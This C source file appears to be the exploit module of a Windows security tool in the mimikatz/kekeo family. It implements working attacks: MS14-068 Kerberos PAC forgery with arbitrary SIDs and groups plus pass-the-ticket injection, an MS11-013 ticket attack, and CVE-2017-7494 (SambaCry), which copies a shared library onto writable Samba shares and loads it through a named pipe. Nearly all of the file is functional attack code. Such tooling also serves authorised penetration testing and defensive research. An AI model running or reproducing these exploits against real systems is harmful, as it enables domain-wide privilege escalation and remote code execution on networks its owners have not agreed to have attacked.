/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_exploit.h"

const KUHL_M_C kuhl_m_c_exploit[] = {
	{kuhl_m_exploit_ms14068,		L"ms14068",	L"MS14-068"},
	{kuhl_m_exploit_ms11013,		L"ms11013",	L"MS11-013"},
	{kuhl_m_exploit_cve20177494,	L"cve20177494", L"CVE-2017-7494 (Samba)"},
};
const KUHL_M kuhl_m_exploit = {
	L"exploit",	L"Exploit module", NULL,
	ARRAYSIZE(kuhl_m_c_exploit), kuhl_m_c_exploit, NULL, NULL
};

NTSTATUS kuhl_m_exploit_ms14068(int argc, wchar_t * argv[])
{
	PKULL_M_SOCK socket;
	KULL_M_SOCK dstSocket;
	OssBuf TgsReq2 = {0, NULL};
	KULL_M_ASN1_TGS_REP *TgsRep, *TgsRep2 = NULL;
	KULL_M_ASN1_EncTGSRepPart *encTgsRepPart, *encTgsRepPart2 = NULL;
	PKIWI_AUTH_INFOS infos;
	RPC_AUTH_IDENTITY_HANDLE hAuth;
	HANDLE hDS;
	DWORD i, nbDcInfos = 0;
	PDS_DOMAIN_CONTROLLER_INFO_1 dcInfos = NULL;
	PWSTR postname;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
	BOOL isSuccess = FALSE;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;

	if(kuhl_m_exploit_generic_ms(argc, argv, &TgsRep, &encTgsRepPart, NULL, &infos, &socket))
	{
		if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq2, &TgsRep->cname, TgsRep->crealm, &encTgsRepPart->sname, NULL, 0, &TgsRep->ticket, &encTgsRepPart->key, NULL, NULL, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"kdc", NULL, NULL) || !infos->w_password)
			{
				if(!kull_m_string_args_byName(argc, argv, L"kdc", NULL, NULL))
					kprintf(L"[DCSs] No KDC specified, neither user password: using default KDC\n");
				if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq2, (LPVOID *) &TgsRep2, KULL_M_ASN1_TGS_REP_PDU))
				{
					if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encTgsRepPart->key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPart2))
					{
						if(postname = kuhl_m_exploit_ms14068_getname(L"(ms14068)", socket->servername))
						{
							kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, postname, callback);
							LocalFree(postname);
						}
						ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart2);
					}
					ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep2);
				}
				ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq2.value);
			}
			else
			{
				i = DsMakePasswordCredentials(infos->w_short_cname, infos->w_realm, infos->w_password, &hAuth);
				if(i == ERROR_SUCCESS)
				{
					i = DsBindWithCred(socket->servername, infos->w_realm, hAuth, &hDS);
					if(i == ERROR_SUCCESS)
					{
						i = DsGetDomainControllerInfo(hDS, infos->w_realm, 1, &nbDcInfos, (PVOID *) &dcInfos);
						if(i == ERROR_SUCCESS)
						{
							kprintf(L"[DCs] Number : %u\n", nbDcInfos);
							for(i = 0; i < nbDcInfos; i++)
							{
								kprintf(L" %u | %s (%s)\n", i, dcInfos[i].DnsHostName, dcInfos[i].NetbiosName);
								if(dcInfos[i].fDsEnabled)
								{
									if(kull_m_sock_init_addr_protocol(dcInfos[i].DnsHostName, NULL, htons(socket->address.sin_port), socket->protocol, &dstSocket))
									{
										if(kull_m_sock_connect(&dstSocket))
										{
											if(kull_m_kerberos_asn1_net_callKdcOssBuf(&dstSocket, &TgsReq2, (LPVOID *) &TgsRep2, KULL_M_ASN1_TGS_REP_PDU))
											{
												if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encTgsRepPart->key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPart2))
												{
													if(postname = kuhl_m_exploit_ms14068_getname(L"(ms14068)", dcInfos[i].NetbiosName))
													{
														isSuccess = kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, postname, callback);
														LocalFree(postname);
													}
													ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart2);
												}
												ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep2);
											}
										}
										kull_m_sock_termSocket(&dstSocket);
									}
								}
								else kprintf(L"  > DC is not enabled!\n");

								if(callback && isSuccess)
								{
									kprintf(L"Break on first injection when Pass-the-Ticket\n");
									break;
								}
							}
							DsFreeDomainControllerInfo(1, nbDcInfos, dcInfos);
						}
						else PRINT_ERROR(L"DsGetDomainControllerInfo: %08x\n", i);
						DsUnBind(&hDS);
					}
					else PRINT_ERROR(L"DsBindWithCred: %08x\n", i);
					DsFreePasswordCredentials(hAuth);
				}
				else PRINT_ERROR(L"DsMakePasswordCredentials: %08x\n", i);
			}
		}
		ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart);
		ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep);
		kull_m_kerberos_asn1_Authinfos_delete(infos);
		kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_exploit_ms11013(int argc, wchar_t * argv[])
{
	PCWSTR szData;
	if(kull_m_string_args_byName(argc, argv, L"service", &szData, NULL))
		kuhl_m_exploit_generic_ms(argc, argv, NULL, NULL, szData, NULL, NULL);
	else PRINT_ERROR(L"A service name is needed ( /service:cifs/target.domain.local[,http/webserver.domain.local] )\n");
	return STATUS_SUCCESS;
}

PWSTR kuhl_m_exploit_ms14068_getname(PCWSTR pre, PCWSTR post)
{
	PWSTR result = NULL;
	DWORD prelen = lstrlen(pre), postlen = lstrlen(post), len = 1 + prelen + 1 + postlen + 1;
	if(result = (PWSTR) LocalAlloc(LPTR, len * sizeof(wchar_t)))
	{
		wcscat_s(result, len, L"_");
		wcscat_s(result, len, pre);
		wcscat_s(result, len, L"_");
		wcscat_s(result, len, post);
	}
	return result;
}

BOOL kuhl_m_exploit_generic_ms(int argc, wchar_t * argv[], KULL_M_ASN1_TGS_REP **TgsRep, KULL_M_ASN1_EncTGSRepPart **encTgsRepPart, PCWSTR szService, PKIWI_AUTH_INFOS *reuseinfos, PKULL_M_SOCK *reusesocket)
{
	BOOL status = FALSE;
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	KULL_M_ASN1_AS_REP *AsRep = NULL;
	KULL_M_ASN1_EncASRepPart *encAsRepPart = NULL;
	KULL_M_ASN1__octet1 pac = {0, NULL};
	OssBuf TgsReq = {0, NULL};
	PWSTR dupService, nextSetToken, SetToken;
	KULL_M_ASN1_PrincipalName pService;
	KULL_M_ASN1_TGS_REP *TgsRepService = NULL;
	KULL_M_ASN1_EncTGSRepPart *encTgsRepPartService = NULL;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		infos->needPac = FALSE;
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
			{
				if(kuhl_m_exploit_give_pac(argc, argv, &encAsRepPart->authtime, infos, socket, &pac))
				{
					if(TgsRep && encTgsRepPart)
					{
						*TgsRep = NULL;
						*encTgsRepPart = NULL;
						if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &AsRep->cname, AsRep->crealm, &encAsRepPart->sname, NULL, 0, &AsRep->ticket, &encAsRepPart->key, NULL, &pac, NULL))
						{
							if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) TgsRep, KULL_M_ASN1_TGS_REP_PDU))
							{
								if(!(status = kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(*TgsRep, &encAsRepPart->key, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart)))
									ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, *TgsRep);
							}
							ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
						}
					}
					else if(szService)
					{
						if(dupService = _wcsdup(szService))
						{
							for(nextSetToken = NULL, SetToken = wcstok_s(dupService, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
							{
								kull_m_kerberos_asn1_PrincipalName_create_fromName(&pService, NULL, SetToken);
								kprintf(L"  ");
								kull_m_kerberos_asn1_PrincipalName_descr(&pService, FALSE);
								kprintf(L"\n");
								if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &AsRep->cname, AsRep->crealm, &pService, NULL, 0, &AsRep->ticket, &encAsRepPart->key, NULL, NULL, NULL))
								{
									if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRepService, KULL_M_ASN1_TGS_REP_PDU))
									{
										if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRepService, &encAsRepPart->key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPartService))
										{
											kull_m_kerberos_asn1_KdcRep_save(TgsRepService, encTgsRepPartService, NULL, L"_(ms11013)", callback);
											ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPartService);
										}
										ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRepService);
									}
									ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
								}
								kull_m_kerberos_asn1_PrincipalName_delete(&pService);
							}
							free(dupService);
						}
					}
				}
				else PRINT_ERROR(L"Unable to build a PAC\n");
				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncASRepPart_PDU, encAsRepPart);
				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_AS_REP_PDU, AsRep);
			}
			if(reusesocket)
				*reusesocket = socket;
			else kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		if(reuseinfos)
			*reuseinfos = infos;
		else kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return status;
}

BOOL kuhl_m_exploit_give_pac(int argc, wchar_t * argv[], KULL_M_ASN1_KerberosTime *authtime, PKIWI_AUTH_INFOS infos, PKULL_M_SOCK socket, KULL_M_ASN1__octet1 *pac)
{
	PCWSTR szData;
	PISID sid = NULL;
	DWORD rid = 0, cbGroups = 0, cbSids = 0, i;
	PGROUP_MEMBERSHIP groups = NULL;
	PKERB_SID_AND_ATTRIBUTES sids = NULL;
	PCLAIMS_SET claims = NULL;
	PKERB_VALIDATION_INFO validationInfo;
	FILETIME ftAuthTime;

	KULL_M_ASN1_AS_REP *asrep = NULL;
	KULL_M_ASN1_EncKDCRepPart *enckdcreppart = NULL;
	OssBuf TgsReq = {0, NULL};
	KULL_M_ASN1_TGS_REP *TgsRep = NULL;
	KULL_M_ASN1__octet1 tmpPac;
	BOOL oldNeedPac;

	pac->length = 0;
	pac->value = NULL;
	if(kull_m_string_args_byName(argc, argv, L"sid", &szData, NULL))
		if(!ConvertStringSidToSid(szData, (PSID *) &sid))
			PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
	if(kull_m_string_args_byName(argc, argv, L"id", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"rid", &szData, NULL))
		rid = wcstoul(szData, NULL, 0);
	kull_m_string_args_byName(argc, argv, L"groups", &szData, NULL);
	kuhl_m_pac_stringToGroups(szData, &groups, &cbGroups);
	if(kull_m_string_args_byName(argc, argv, L"sids", &szData, NULL))
		kuhl_m_pac_stringToSids(szData, &sids, &cbSids);
	if(kull_m_string_args_byName(argc, argv, L"claims", &szData, NULL))
		claims = kuhl_m_kerberos_claims_createFromString(szData);

	if(!(sid && rid))
	{
		oldNeedPac = infos->needPac;
		infos->needPac = TRUE;
		if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &asrep, &enckdcreppart, NULL))
		{
			if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
			{
				if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, KULL_M_ASN1_TGS_REP_PDU))
				{
					if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &tmpPac))
					{
						if(!kuhl_m_kerberos_pac_to_infos((PPACTYPE) tmpPac.value, tmpPac.length, &sid, &rid))
							PRINT_ERROR(L"Unable to get SID and/or RID from a PAC\n");
						if(tmpPac.value)
							LocalFree(tmpPac.value);
					}
					else PRINT_ERROR(L"No PAC found\n");
					ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep);
				}
				ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncASRepPart_PDU, enckdcreppart);
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_AS_REP_PDU, asrep);
		}
		infos->needPac = oldNeedPac;
	}

	if(sid && rid && groups && cbGroups)
	{
		kull_m_kerberos_asn1_KerberosTime_to_filetime(authtime, &ftAuthTime);
		kprintf(L"AuthTime     : ");
		kull_m_string_displayLocalFileTime(&ftAuthTime);
		kprintf(L"\nDomain SID   : ");
		kull_m_string_displaySID(sid);
		kprintf(L"\nUser RID     : %u\nGroups       : *", rid);
		for(i = 0; i < cbGroups; i++)
			kprintf(L"%u ", groups[i].RelativeId);
		kprintf(L"\n");
		if(sids && cbSids)
		{
			kprintf(L"Extra SIDs   :\n");
			for(i = 0; i < cbSids; i++)
			{
				kprintf(L"  ");
				kull_m_string_displaySID(sids[i].Sid);
				kprintf(L"\n");
			}
		}
		if(claims)
		{
			kprintf(L"Claims       :\n");
			kuhl_m_kerberos_claims_displayClaimsSet(claims);
			kprintf(L"\n");
		}
		
		if(validationInfo = kuhl_m_pac_infoToValidationInfo(&ftAuthTime, infos->w_short_cname, infos->w_realm, infos->w_short_realm, sid, rid, groups, cbGroups, sids, cbSids))
		{
			if(kuhl_m_pac_validationInfo_to_PAC(validationInfo, &ftAuthTime, infos->w_cname, KERB_CHECKSUM_MD5, claims, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
			{
				if(!NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, KERB_CHECKSUM_MD5, NULL, 0)))
				{
					LocalFree(pac->value);
					pac->length = 0;
					pac->value = NULL;
				}
			}
			LocalFree(validationInfo);
		}
	}

	if(sid)
		LocalFree(sid);
	if(groups && cbGroups)
		LocalFree(groups);
	if(sids && cbSids)
	{
		for(i = 0; i < cbSids; i++)
			LocalFree(sids[i].Sid);
		LocalFree(sids);
	}
	if(claims)
		kuhl_m_kerberos_claims_free(claims);
	return (pac->value != NULL);
}

NTSTATUS kuhl_m_exploit_cve20177494(int argc, wchar_t * argv[])
{
	NET_API_STATUS nStatus;
	LPSERVER_INFO_102 pServerInfo;
	LPSHARE_INFO_502 pShareInfo;
	DWORD i, dwEntriesRead, dwTotalEntries, dwResumeHandle = 0;
	LPWSTR destfilename, remotelocalfilename, pipename;
	LPCWSTR szServer, szFilename, szBaseFileName;

	if(kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL))
	{
		kprintf(L"Server: %s\n", szServer);
		if(kull_m_string_args_byName(argc, argv, L"module", &szFilename, NULL))
		{
			szBaseFileName = PathFindFileName(szFilename);
			kprintf(L"Module: %s (%s)\n", szFilename, szBaseFileName);
			nStatus = NetServerGetInfo((LPWSTR) szServer, 102, (LPBYTE*) &pServerInfo);
			if(nStatus == NERR_Success)
			{
				if(pServerInfo->sv102_type & SV_TYPE_SERVER_UNIX)
				{
					do
					{
						nStatus = NetShareEnum ((LPWSTR) szServer, 502, (LPBYTE*) &pShareInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);
						if((nStatus == 0) || (nStatus == ERROR_MORE_DATA))
						{
							for (i = 0; i < dwEntriesRead; i++)
							{
								if((pShareInfo[i].shi502_type & STYPE_MASK) == STYPE_DISKTREE)
								{
									kprintf(L"\n* %s ( %s )\n", pShareInfo[i].shi502_netname, pShareInfo[i].shi502_path);
									if(destfilename = kuhl_m_exploit_cve20177494_getDestFilename(szBaseFileName, szServer, pShareInfo[i].shi502_netname))
									{
										kprintf(L"  destfilename       : %s\n", destfilename);
										if(remotelocalfilename = kuhl_m_exploit_cve20177494_getRemoteLocalFilename(szBaseFileName, pShareInfo[i].shi502_path))
										{
											kprintf(L"  remotelocalfilename: %s\n", remotelocalfilename);
											if(pipename = kuhl_m_exploit_cve20177494_getPipeName(szServer, remotelocalfilename))
											{
												kprintf(L"  pipename           : %s\n", pipename);	
												if(CopyFileEx(szFilename, destfilename, NULL, NULL, NULL, 0))
												{
													kprintf(L"  > file \'%s\' is now on server\n", szBaseFileName);
													if(kull_m_file_isFileExist(pipename))
													{
														kprintf(L"  + Server confirmed pipe was registered!\n");
														dwEntriesRead = 0; // will stop enum
													}
													else if(GetLastError() == ERROR_FILE_NOT_FOUND)
													{
														kprintf(L"  - Server returned FILE_NOT_FOUND (not vulnerable, or can be normal if the module does not register itself, check by another way)\n");
														dwEntriesRead = 0; // will stop enum too, not a real success, but few chance we'll load better in another share...
													}
													else if(GetLastError() == ERROR_NETNAME_DELETED)
													{
														kprintf(L"  - NETNAME_DELETED (something went very bad... but can be \"\"normal\"\" with Synology DSM 5.2 as it run init function anyway...)\n");
														dwEntriesRead = 0; // will stop enum too, may be a bad success, but few chance we'll load better in another share...
													}
													else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");

													if(DeleteFile(destfilename))
														kprintf(L"  < file was deleted\n");
													else PRINT_ERROR_AUTO(L"DeleteFile");
												}
												else if(GetLastError() == ERROR_ACCESS_DENIED)
													kprintf(L"  - Access denied\n");
												else PRINT_ERROR_AUTO(L"CopyFileEx");
												LocalFree(pipename);
											}
											LocalFree(remotelocalfilename);
										}
										LocalFree(destfilename);
									}
								}
							}
							NetApiBufferFree(pShareInfo);
						}
						else PRINT_ERROR(L"NetShareEnum: %08x\n", nStatus);
					}
					while (nStatus == ERROR_MORE_DATA);
				}
				else PRINT_ERROR(L"Server type is not UNIX\n");
				NetApiBufferFree(pServerInfo);
			}
			else PRINT_ERROR(L"NetServerGetInfo: %08x\n", nStatus);
		}
		else PRINT_ERROR(L"Argument \'/module:lib_smb_pipe.so\' is needed\n");
	}
	else PRINT_ERROR(L"Argument \'/server:{name|ip}\' is needed\n");
	return STATUS_SUCCESS;
}
#pragma warning(push)
#pragma warning(disable:4996) // because I love _snwprintf here
PWSTR kuhl_m_exploit_cve20177494_getDestFilename(LPCWSTR filename, LPCWSTR servername, LPCWSTR share)
{
	PWSTR result = NULL;
	int len = _snwprintf(NULL, 0, L"\\\\%s\\%s\\%s", servername, share, filename);
	if(len > 0)
		if(result = (PWSTR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
			if(_snwprintf(result, len + 1, L"\\\\%s\\%s\\%s", servername, share, filename) < len)
				result = (PWSTR) LocalFree(result);
	return result;
}

PWSTR kuhl_m_exploit_cve20177494_getRemoteLocalFilename(LPCWSTR filename, LPWSTR path)
{
	PWSTR result = NULL;
	DWORD i, dwPath = lstrlenW(path);
	int len;

	if(dwPath > 2)
	{
		if(path[1] == L':')
		{
			path += 2;
			dwPath -= 2;
		}
		
		for(i = 0; i < dwPath; i++)
			if(path[i] == L'\\')
				path[i] = L'/';

		if(path[dwPath - 1] == L'/')
			path[dwPath - 1] = L'\0';

		len = _snwprintf(NULL, 0, L"%s/%s", path, filename);
		if(len > 0)
			if(result = (PWSTR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
				if(_snwprintf(result, len + 1, L"%s/%s", path, filename) < len)
					result = (PWSTR) LocalFree(result);
	}
	return result;
}

PWSTR kuhl_m_exploit_cve20177494_getPipeName(LPCWSTR servername, LPCWSTR remotelocalfilename)
{
	PWSTR result = NULL;
	int len = _snwprintf(NULL, 0, L"\\??\\UNC\\%s\\pipe\\%s", servername, remotelocalfilename);
	if(len > 0)
		if(result = (PWSTR) LocalAlloc(LPTR, (len + 1) * sizeof(wchar_t)))
			if(_snwprintf(result, len + 1, L"\\??\\UNC\\%s\\pipe\\%s", servername, remotelocalfilename) < len)
				result = (PWSTR) LocalFree(result);
	return result;
}
#pragma warning(pop)